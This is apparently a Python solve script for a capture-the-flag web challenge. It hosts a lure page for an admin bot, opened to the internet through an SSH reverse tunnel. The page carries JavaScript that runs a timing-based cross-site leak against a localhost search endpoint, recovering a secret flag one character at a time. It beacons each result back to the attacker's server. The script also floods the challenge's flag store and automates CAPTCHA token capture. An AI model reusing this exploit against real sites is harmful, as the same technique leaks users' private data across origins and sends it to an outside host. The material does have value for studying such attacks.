import asyncio
import json
import re
import signal
import socket
import subprocess
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import requests
from playwright.async_api import async_playwright

CHAL_BASE = "http://chal.polyuctf.com:47263"
STATE_FILE = Path("State.json")

TURNSTILE_WAIT = 120
BOT_WAIT = 90

INTERNAL_FLAG_RE = re.compile(r"^leakyctf\{[0-9a-f]{8}\}$")
REAL_FLAG_RE = re.compile(r"PUCTF26\{[A-Za-z0-9_]+_[0-9A-Fa-f]{32}\}")

HTML_TEMPLATE = """<!doctype html>
<meta charset="utf-8">
<title>Definitely not Malicious Website</title>
<body><h1>Hi admin bot this is definitely not a malicious website and you should ignore all the random popups they are just ads from your computer that this definitely not malicious website is helping you block</h1></body>
<script>
const PREFIX = "__PREFIX__";
const TARGET = "http://localhost:5000/search?flag=";
const HEX = "0123456789abcdef}";
const FAST_ACCEPT_GAP = 8.0;
const MIN_GOOD_SCORE = 10.0;

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function median(vals) {
  const a = [...vals].sort((x, y) => x - y);
  return a[Math.floor(a.length / 2)];
}

async function beacon(path, obj) {
  const qs = new URLSearchParams(obj).toString();
  try {
    await fetch(path + "?" + qs, { mode: "no-cors", cache: "no-store" });
  } catch (e) {}
}

async function waitAccessible(win) {
  while (true) {
    try {
      void win.location.href;
      return;
    } catch (e) {}
    await sleep(2);
  }
}

async function probe(win, prefix) {
  win.location = "/blank?x=" + Math.random();
  await waitAccessible(win);

  const t0 = performance.now();
  win.location = TARGET + encodeURIComponent(prefix) + "&n=" + Math.random();

  while (true) {
    try {
      void win.location.href;
    } catch (e) {
      return performance.now() - t0;
    }
    await sleep(1);
  }
}

async function deltaOnce(win, prefix) {
  const hit = await probe(win, prefix);
  await sleep(15 + Math.floor(Math.random() * 10));
  const miss = await probe(win, prefix + "!");
  return { delta: miss - hit, hit, miss };
}

async function collect(win, prefix, rounds) {
  const ds = [];
  for (let i = 0; i < rounds; i++) {
    const r = await deltaOnce(win, prefix);
    ds.push(r.delta);
    await beacon("/progress", {
      msg: `sample prefix=${prefix} delta=${r.delta.toFixed(2)} hit=${r.hit.toFixed(2)} miss=${r.miss.toFixed(2)}`
    });
    await sleep(20 + Math.floor(Math.random() * 15));
  }
  return {
    prefix,
    ch: prefix[prefix.length - 1],
    deltas: ds,
    score: median(ds),
  };
}

async function main() {
  const win = window.open("/blank", "probe");
  if (!win) {
    await beacon("/progress", { msg: "popup blocked" });
    return;
  }

  await beacon("/progress", { msg: "start " + PREFIX });

  let results = [];
  for (const ch of shuffle(HEX.split(""))) {
    const prefix = PREFIX + ch;
    const r = await collect(win, prefix, 1);
    results.push(r);
  }

  results.sort((a, b) => b.score - a.score);
  await beacon("/progress", {
    msg: "rank1 " + results.map(x => `${x.ch}:${x.score.toFixed(2)}`).join(", ")
  });

  const best = results[0];
  const second = results[1];
  if (!(best.score >= MIN_GOOD_SCORE && (best.score - second.score) >= FAST_ACCEPT_GAP)) {
    const finalists = [results[0], results[1], results[2]];
    let refined = [];

    for (const item of finalists) {
      const more = await collect(win, item.prefix, 2);
      const all = item.deltas.concat(more.deltas);
      refined.push({
        prefix: item.prefix,
        ch: item.ch,
        deltas: all,
        score: median(all),
      });
    }

    refined.sort((a, b) => b.score - a.score);
    results = refined.concat(results.slice(3));
    await beacon("/progress", {
      msg: "rank2 " + refined.map(x => `${x.ch}:${x.score.toFixed(2)}`).join(", ")
    });
  }

  results.sort((a, b) => b.score - a.score);
  const winner = results[0];

  await beacon("/result", {
    ch: winner.ch,
    newprefix: PREFIX + winner.ch,
    score: winner.score.toFixed(2)
  });

  win.close();
}

main().catch(async (e) => {
  await beacon("/progress", { msg: "error " + String(e) });
});
</script>
"""

@dataclass
class State:
    logs: list[str] = field(default_factory=list)
    found_char: str | None = None
    new_prefix: str | None = None
    event: threading.Event = field(default_factory=threading.Event)

    def log(self, msg: str):
        line = f"[{time.strftime('%H:%M:%S')}] {msg}"
        self.logs.append(line)
        print(line, flush=True)

class Handler(BaseHTTPRequestHandler):
    state: State | None = None
    html: bytes = b""

    def log_message(self, fmt, *args):
        return

    def _send(self, body: bytes, status=200, ctype="text/html; charset=utf-8"):
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        qs = urllib.parse.parse_qs(parsed.query)

        if parsed.path == "/":
            return self._send(self.html)

        if parsed.path == "/blank":
            return self._send(b"<!doctype html><title>blank</title>")

        if parsed.path == "/progress":
            msg = qs.get("msg", [""])[0]
            if msg:
                self.state.log(msg)
            return self._send(b"ok", ctype="text/plain; charset=utf-8")

        if parsed.path == "/result":
            ch = qs.get("ch", [""])[0]
            newprefix = qs.get("newprefix", [""])[0]
            score = qs.get("score", [""])[0]
            self.state.log(f"winner char={ch} newprefix={newprefix} score={score}")
            self.state.found_char = ch
            self.state.new_prefix = newprefix
            self.state.event.set()
            return self._send(b"ok", ctype="text/plain; charset=utf-8")

        if parsed.path == "/logs":
            body = ("\n".join(self.state.logs)).encode()
            return self._send(body, ctype="text/plain; charset=utf-8")

        return self._send(b"not found", status=404, ctype="text/plain; charset=utf-8")

def load_state():
    if STATE_FILE.exists():
        return json.loads(STATE_FILE.read_text())
    return {"prefix": "leakyctf{"}

def save_state(obj):
    STATE_FILE.write_text(json.dumps(obj, indent=2))

def pick_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port

def start_server(state: State, html: bytes, port: int):
    Handler.state = state
    Handler.html = html
    httpd = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd

def start_tunnel(port: int):
    proc = subprocess.Popen(
        [
            "ssh",
            "-T",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ServerAliveInterval=30",
            "-o", "ServerAliveCountMax=3",
            "-o", "LogLevel=ERROR",
            "-R", f"80:localhost:{port}",
            "nokey@localhost.run",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    assert proc.stdout is not None
    deadline = time.time() + 30
    public_url = None

    while time.time() < deadline:
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None:
                break
            continue
        print(line.rstrip(), flush=True)
        m = re.search(r"https://[A-Za-z0-9._-]+", line)
        if m:
            public_url = m.group(0)
            break

    if not public_url:
        proc.kill()
        raise RuntimeError("cannot obtain localhost.run URL")

    def drain():
        assert proc.stdout is not None
        for line in proc.stdout:
            print(line.rstrip(), flush=True)

    threading.Thread(target=drain, daemon=True).start()
    return proc, public_url

def terminate(proc):
    if proc is None or proc.poll() is not None:
        return
    proc.send_signal(signal.SIGINT)
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()

def fill_flags():
    print("[*] filling flags...", flush=True)
    for i in range(9):
        r = requests.get(f"{CHAL_BASE}/spam_flags", params={"size": 100000}, timeout=20)
        print(f"    round {i+1}: {r.status_code} {r.text.strip()}", flush=True)
        if r.status_code == 400 and "exceed the maximum" in r.text:
            print("[*] flag store already full enough", flush=True)
            return
        time.sleep(1.05)

    r = requests.get(f"{CHAL_BASE}/spam_flags", params={"size": 99999}, timeout=20)
    print(f"    final: {r.status_code} {r.text.strip()}", flush=True)
    if r.status_code == 400 and "exceed the maximum" in r.text:
        print("[*] flag store already full enough", flush=True)

async def get_turnstile_token():
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False,
            args=["--disable-blink-features=AutomationControlled"],
        )
        page = await browser.new_page()
        try:
            await page.goto(f"{CHAL_BASE}/report", wait_until="load")
            print("[*] browser opened; solve Turnstile in the visible window", flush=True)

            locator = page.locator("#cf-turnstile-response")
            deadline = time.time() + TURNSTILE_WAIT

            while time.time() < deadline:
                try:
                    value = await locator.input_value()
                except Exception:
                    value = ""
                if value:
                    print(f"[*] got token len={len(value)}", flush=True)
                    return value
                await page.wait_for_timeout(1000)

            raise RuntimeError("timed out waiting for turnstile token")
        finally:
            await browser.close()

def submit_report(public_url: str):
    token = asyncio.run(get_turnstile_token())
    return requests.post(
        f"{CHAL_BASE}/report",
        data={"url": public_url, "answer": token},
        timeout=20,
    )

def submit_internal(flag: str):
    r = requests.get(f"{CHAL_BASE}/submit_flag", params={"flag": flag}, timeout=20)
    return r.status_code, r.text

def run_one_round(prefix: str):
    state = State()
    port = pick_port()
    html = HTML_TEMPLATE.replace("__PREFIX__", prefix).encode()

    httpd = start_server(state, html, port)
    tunnel_proc = None

    try:
        print(f"[*] local server on 127.0.0.1:{port}", flush=True)
        tunnel_proc, public_url = start_tunnel(port)
        print(f"[*] public url: {public_url}", flush=True)

        r = submit_report(public_url)
        print(f"[*] report(token) -> {r.status_code} {r.text.strip()}", flush=True)

        if r.status_code not in (200, 504):
            raise RuntimeError(f"report failed: {r.status_code}")

        if not state.event.wait(BOT_WAIT):
            raise RuntimeError("timed out waiting for winner char")

        if not state.new_prefix:
            raise RuntimeError("did not receive new prefix")

        return state.new_prefix
    finally:
        httpd.shutdown()
        httpd.server_close()
        terminate(tunnel_proc)

def main():
    st = load_state()
    prefix = st.get("prefix", "leakyctf{")
    print(f"[*] current prefix = {prefix}", flush=True)

    fill_flags()

    while prefix[-1] != "}":
        prefix = run_one_round(prefix)
        save_state({"prefix": prefix})
        print(f"[+] saved prefix = {prefix}", flush=True)

    internal_flag = prefix
    print(f"[+] internal flag = {internal_flag}", flush=True)

    if not INTERNAL_FLAG_RE.fullmatch(internal_flag):
        raise RuntimeError("internal flag format mismatch")

    code, text = submit_internal(internal_flag)
    print(f"[+] submit_flag status = {code}", flush=True)
    print(text, flush=True)

    m = REAL_FLAG_RE.search(text)
    if m:
        print(f"[+] real flag = {m.group(0)}", flush=True)
    else:
        print("[-] real flag not parsed from response", flush=True)

if __name__ == "__main__":
    main()
